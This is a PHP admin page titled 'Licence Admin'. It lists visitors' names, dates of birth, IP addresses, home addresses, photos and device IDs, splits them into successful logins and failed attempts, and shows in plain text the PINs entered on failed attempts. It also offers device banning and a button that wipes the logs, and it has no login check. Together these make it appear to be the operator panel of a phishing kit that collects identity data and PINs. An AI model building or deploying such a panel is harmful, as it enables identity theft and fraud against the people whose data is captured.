<?php
$stateFile = '/var/log/licence-app/latest_state.json';
$bannedFile = '/var/www/licence/banned_devices.txt';

// Handle actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['ban_device'])) {
        $deviceId = $_POST['deviceId'];
        if ($deviceId && $deviceId !== 'unknown') {
            file_put_contents($bannedFile, $deviceId . "\n", FILE_APPEND | LOCK_EX);
        }
    } elseif (isset($_POST['unban_device'])) {
        $deviceId = $_POST['deviceId'];
        if (file_exists($bannedFile)) {
            $banned = file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $banned = array_filter($banned, fn($id) => trim($id) !== $deviceId);
            file_put_contents($bannedFile, implode("\n", $banned) . "\n");
        }
    } elseif (isset($_POST['clear_all'])) {
        if (file_exists($stateFile)) file_put_contents($stateFile, '{}');
        if (file_exists('/var/log/licence-app/access.log')) file_put_contents('/var/log/licence-app/access.log', '');
    }
    header("Location: admin.php");
    exit;
}

// Read data
$state = file_exists($stateFile) ? json_decode(file_get_contents($stateFile), true) : [];
$banned = file_exists($bannedFile) ? file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];

// Sort state by last_seen
uasort($state, function($a, $b) {
    return strtotime($b['last_seen'] ?? 0) - strtotime($a['last_seen'] ?? 0);
});

// Separate success vs fail
$successful = [];
$failed = [];

foreach ($state as $id => $data) {
    if (!empty($data['has_success'])) {
        $successful[$id] = $data;
    } else {
        $failed[$id] = $data;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Licence Admin Dashboard</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; color: #1c1e21; }
        .container { max-width: 1200px; margin: 0 auto; }
        header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        h1 { margin: 0; font-size: 24px; }
        .section-title { background: #fff; padding: 10px 15px; border-radius: 8px 8px 0 0; border-bottom: 1px solid #ddd; margin-top: 30px; font-weight: bold; display: flex; justify-content: space-between; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; background: #fff; padding: 20px; border-radius: 0 0 8px 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .card { border: 1px solid #ddd; border-radius: 12px; padding: 15px; display: flex; flex-direction: column; gap: 10px; background: #fff; position: relative; }
        .card.banned { opacity: 0.6; background: #ffebee; }
        .card-header { display: flex; gap: 15px; }
        .photo-wrap { width: 100px; height: 100px; background: #eee; border-radius: 8px; overflow: hidden; flex-shrink: 0; border: 1px solid #ddd; }
        .photo-wrap img { width: 100%; height: 100%; object-fit: cover; }
        .info { flex-grow: 1; min-width: 0; }
        .info div { margin-bottom: 4px; font-size: 14px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .label { color: #65676b; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-right: 5px; }
        .tag { font-size: 11px; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
        .tag-success { background: #e7f3ff; color: #1877f2; }
        .tag-fail { background: #fff0f0; color: #d32f2f; }
        .tag-banned { background: #333; color: #fff; }
        .history { margin-top: 10px; font-size: 12px; background: #f8f9fa; padding: 8px; border-radius: 6px; max-height: 100px; overflow-y: auto; }
        .history-item { border-bottom: 1px solid #eee; padding: 3px 0; display: flex; justify-content: space-between; }
        .history-item:last-child { border-bottom: none; }
        .actions { margin-top: auto; display: flex; gap: 10px; padding-top: 10px; border-top: 1px solid #eee; }
        .btn { border: none; padding: 8px 12px; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 13px; flex: 1; }
        .btn-ban { background: #f02849; color: #fff; }
        .btn-unban { background: #333; color: #fff; }
        .btn-clear { background: #4267b2; color: #fff; }
        .btn-refresh { background: #fff; border: 1px solid #ddd; color: #1c1e21; }
        .empty { text-align: center; color: #65676b; padding: 40px; grid-column: 1 / -1; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🛡️ Licence Admin</h1>
            <div style="display:flex; gap:10px;">
                <button onclick="location.reload()" class="btn btn-refresh">🔄 Refresh</button>
                <form method="post" onsubmit="return confirm('Clear all data?')">
                    <button type="submit" name="clear_all" class="btn btn-clear">🗑️ Clear Logs</button>
                </form>
            </div>
        </header>

        <div class="section-title">
            <span>✅ SUCCESSFUL LOGINS (<?=count($successful)?>)</span>
        </div>
        <div class="grid">
            <?php if (empty($successful)): ?>
                <div class="empty">No successful logins yet.</div>
            <?php else: ?>
                <?php foreach ($successful as $id => $u): 
                    $isBanned = in_array($id, $banned);
                ?>
                    <div class="card <?= $isBanned ? 'banned' : '' ?>">
                        <div class="card-header">
                            <div class="photo-wrap">
                                <?php if (!empty($u['photo'])): ?>
                                    <img src="<?= htmlspecialchars($u['photo']) ?>" alt="User Photo">
                                <?php else: ?>
                                    <div style="display:flex;align-items:center;justify-content:center;height:100%;color:#ccc;">No Photo</div>
                                <?php endif; ?>
                            </div>
                            <div class="info">
                                <div style="font-weight:bold;font-size:16px;"><?= htmlspecialchars($u['name']) ?></div>
                                <div><span class="label">DOB:</span> <?= htmlspecialchars($u['dob']) ?></div>
                                <div><span class="label">IP:</span> <?= htmlspecialchars($u['ip']) ?></div>
                                <div><span class="label">ID:</span> <small><?= htmlspecialchars($id) ?></small></div>
                                <div>
                                    <span class="tag tag-success">Success: <?= $u['success_count'] ?></span>
                                    <?php if ($isBanned): ?><span class="tag tag-banned">BANNED</span><?php endif; ?>
                                </div>
                            </div>
                        </div>
                        <div><span class="label">Address:</span> <?= htmlspecialchars($u['address'] ?? '—') ?></div>
                        <div class="history">
                            <?php foreach ($u['history'] as $h): ?>
                                <div class="history-item">
                                    <span><?= htmlspecialchars($h['event']) ?></span>
                                    <span style="color:#65676b;"><?= date('H:i:s', strtotime($h['timestamp'])) ?></span>
                                </div>
                            <?php endforeach; ?>
                        </div>
                        <div class="actions">
                            <form method="post" style="flex:1;display:flex;">
                                <input type="hidden" name="deviceId" value="<?= htmlspecialchars($id) ?>">
                                <?php if ($isBanned): ?>
                                    <button type="submit" name="unban_device" class="btn btn-unban">Unban Device</button>
                                <?php else: ?>
                                    <button type="submit" name="ban_device" class="btn btn-ban">Ban Device</button>
                                <?php endif; ?>
                            </form>
                        </div>
                    </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>

        <div class="section-title" style="background:#fff0f0;">
            <span>❌ FAILED ATTEMPTS (<?=count($failed)?>)</span>
        </div>
        <div class="grid">
            <?php if (empty($failed)): ?>
                <div class="empty">No failed attempts.</div>
            <?php else: ?>
                <?php foreach ($failed as $id => $u): 
                    $isBanned = in_array($id, $banned);
                ?>
                    <div class="card <?= $isBanned ? 'banned' : '' ?>">
                        <div class="card-header">
                            <div class="photo-wrap">
                                <?php if (!empty($u['photo'])): ?>
                                    <img src="<?= htmlspecialchars($u['photo']) ?>" alt="User Photo">
                                <?php else: ?>
                                    <div style="display:flex;align-items:center;justify-content:center;height:100%;color:#ccc;">No Photo</div>
                                <?php endif; ?>
                            </div>
                            <div class="info">
                                <div style="font-weight:bold;"><?= htmlspecialchars($u['name'] !== '—' ? $u['name'] : 'Unknown Visitor') ?></div>
                                <div><span class="label">IP:</span> <?= htmlspecialchars($u['ip']) ?></div>
                                <div><span class="label">ID:</span> <small><?= htmlspecialchars($id) ?></small></div>
                                <div>
                                    <span class="tag tag-fail">Fails: <?= $u['fail_count'] ?></span>
                                    <?php if ($isBanned): ?><span class="tag tag-banned">BANNED</span><?php endif; ?>
                                </div>
                            </div>
                        </div>
                        <div class="history">
                            <?php foreach ($u['history'] as $h): ?>
                                <div class="history-item">
                                    <span><?= htmlspecialchars($h['event']) ?> <?= !empty($h['pin']) ? "(".htmlspecialchars($h['pin']).")" : "" ?></span>
                                    <span style="color:#65676b;"><?= date('H:i:s', strtotime($h['timestamp'])) ?></span>
                                </div>
                            <?php endforeach; ?>
                        </div>
                        <div class="actions">
                            <form method="post" style="flex:1;display:flex;">
                                <input type="hidden" name="deviceId" value="<?= htmlspecialchars($id) ?>">
                                <?php if ($isBanned): ?>
                                    <button type="submit" name="unban_device" class="btn btn-unban">Unban Device</button>
                                <?php else: ?>
                                    <button type="submit" name="ban_device" class="btn btn-ban">Ban Device</button>
                                <?php endif; ?>
                            </form>
                        </div>
                    </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
    </div>
    <script>
        // Auto refresh every 30s
        setTimeout(() => location.reload(), 30000);
    </script>
</body>
</html>
